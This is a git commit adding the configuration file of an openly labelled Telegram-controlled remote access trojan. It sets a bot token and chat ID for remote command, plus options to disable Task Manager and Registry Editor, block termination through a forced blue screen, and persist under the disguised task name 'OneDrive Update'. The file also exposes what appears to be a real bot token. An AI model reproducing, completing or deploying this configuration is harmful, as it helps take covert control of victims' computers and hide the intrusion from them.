558758768ac6b564d18c983be76b801f84ba55ae
Synax-coder <75259935+Synax-coder@users.noreply.github.com>
2021-09-10 14:27:48 -0400

    Add files via upload

---
+++ RAT.py
@@ -0,0 +1,38 @@
+from API import *
+
+
+# Token/ID
+TelegramToken = '1879830013:AAGsxo3GCzu41gAXUDJW3uTIj1G1gCDt-9o'
+TelegramChatID = '1976222306'
+
+
+# Run the script as administrator
+AdminRightsRequired = False
+
+# Disable Task Manager at first start
+DisableTaskManager = False
+# Disable Registry Editor at first start
+DisableRegistryTools = False
+
+# Process protection from termination and deletion
+ProcessBSODProtectionEnabled = False
+
+
+# Add to startup at first start
+AutorunEnabled = False
+# Installation directory
+InstallPath = 'C:\\ProgramData\\'
+# Task name in Task Scheduler
+AutorunName = 'OneDrive Update'
+# The name of the process in the Task Manager
+ProcessName = 'synax.exe'
+
+
+# Display a message at first start
+DisplayMessageBox = False
+# Your Message (will be displayed at start)
+Message = 'Message'
+
+
+# Directory for saving trojan temporary files
+Directory = 'C:\\Windows\\Temp\\TelegramRAT\\'
